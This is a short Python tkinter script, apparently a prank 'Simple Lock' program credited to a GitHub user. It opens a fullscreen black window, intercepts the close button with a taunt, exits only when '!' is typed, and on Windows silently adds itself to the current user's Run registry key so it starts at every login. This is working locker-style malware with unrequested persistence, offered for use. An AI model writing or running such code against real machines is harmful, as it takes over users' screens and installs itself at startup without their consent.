import tkinter as tk
import os
import sys

def check_key(event=None):
    if entry.get() == "!":
        root.destroy()
    else:
        label.config(text="Nope")

def on_closing():
    label.config(text="You think I'm dumb?")

def add_to_startup():
    if sys.platform == 'win32':
        try:
            script_path = os.path.abspath(sys.argv[0])
            import winreg as reg
            key = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
            reg.SetValueEx(reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_WRITE), 'MyTkinterApp', 0, reg.REG_SZ, script_path)
            print("✅")
        except Exception as e:
            print(f"❌: {e}")

# Main application
root = tk.Tk()
root.attributes("-fullscreen", True)
root.configure(background='black')
root.protocol("WM_DELETE_WINDOW", on_closing)

label = tk.Label(root, text="Simple Lock🔒", fg="white", bg="black", font=("Helvetica", 24))
label.pack(pady=20)

entry = tk.Entry(root, font=("Helvetica", 24), width=20)
entry.pack(pady=10)
entry.focus_set()
entry.bind("<Return>", check_key)

# GitHub label at the bottom
github_label = tk.Label(root, text="R4tD3v on github©️", fg="white", bg="black", font=("Helvetica", 12))
github_label.pack(side=tk.BOTTOM, pady=10)

add_to_startup()
root.mainloop()
